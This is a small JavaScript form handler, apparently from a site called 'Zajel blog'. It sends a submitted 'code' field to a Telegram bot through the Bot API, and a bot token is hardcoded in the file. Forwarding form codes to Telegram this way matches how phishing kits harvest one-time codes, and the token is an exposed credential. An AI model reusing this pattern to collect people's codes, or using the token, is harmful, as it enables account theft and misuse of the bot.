const form = document.querySelector("#form");

form.addEventListener("submit", (e) =>{
    e.preventDefault();
   

     var txtService = document.getElementById("txtService").value;


     
    


    var my_text = `  مدونة زاجل> %0A%0A كود :${txtService}%0A`

      var token ="7409356455:AAF0wdhXgWCYsnV2raiK2KHZnMjbeuMCRJI";
      var chat_id =-4595005407
    var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}%0A`
    
let api = new XMLHttpRequest();
api.open("GET", url, true);
api.send();

    console.log("Message successfully sended!")
})